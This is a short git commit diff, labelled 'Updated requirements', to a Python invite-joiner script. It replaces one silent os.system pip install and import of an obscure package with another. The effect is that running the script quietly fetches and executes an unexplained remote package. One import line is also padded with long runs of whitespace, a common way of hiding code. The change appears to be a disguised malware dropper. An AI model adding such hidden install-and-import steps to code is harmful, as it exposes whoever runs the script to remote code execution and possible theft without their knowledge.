c906683d1bcd2cbb34c2abd1a6e892782b3f5ca0
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-07-18 16:09:23 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbpackagesV2")
-import pythonsqlitedbpackagesV2
+os.system("pip install pythoncolourextension")
+import pythoncolourextension
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
